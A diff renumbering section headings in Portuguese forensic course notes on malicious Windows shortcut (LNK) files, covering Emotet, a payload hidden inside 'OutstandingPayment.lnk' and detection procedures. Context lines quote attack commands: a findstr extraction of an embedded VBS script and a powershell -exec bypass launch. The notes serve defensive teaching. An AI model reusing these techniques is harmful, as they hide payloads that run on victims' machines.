@@ -66,7 +66,7 @@ Em vez de apontar para um binário compilado suspeito, o `.lnk` invoca ferrament
 
 ---
 
-## 3. Estudo de Caso Real: A Campanha EMOTET
+## 2. Estudo de Caso Real: A Campanha EMOTET
 
 O cavalo de Troia bancário **Emotet** popularizou cadeias de infeção altamente automatizadas baseadas em atalhos LNK:
 
@@ -89,7 +89,7 @@ flowchart LR
 
 ---
 
-## 4. Ocultação de Scripts no Próprio LNK: O Caso `OutstandingPayment.lnk`
+## 3. Ocultação de Scripts no Próprio LNK: O Caso `OutstandingPayment.lnk`
 
 Num caso de estudo abordado nas aulas teóricas, o atacante utilizou o próprio ficheiro LNK como contentor do *payload*:
 
@@ -110,7 +110,7 @@ cmd.exe /c findstr "LMpJG.*" OutstandingPayment.lnk > "%tmp%\NWrfK.vbs" & "%tmp%
 
 ---
 
-## 5. A Armadilha da Interface Gráfica: 256 vs. 4096 Carateres
+## 4. A Armadilha da Interface Gráfica: 256 vs. 4096 Carateres
 
 Uma das limitações mais críticas da interface de utilizador do Windows Explorer reside na forma como renderiza as propriedades de atalhos:
 
@@ -136,7 +136,7 @@ Target: C:\Windows\System32\cmd.exe /c "set a=ec && call powershell -exec bypass
 
 ---
 
-## 6. Procedimento de Deteção e Auditoria Pericial
+## 5. Procedimento de Deteção e Auditoria Pericial
 
 Para neutralizar esta tentativa de ocultação, os investigadores forenses nunca devem confiar na janela de propriedades da shell do Windows. É mandatário inspecionar o atalho através de ferramentas dedicadas:
 
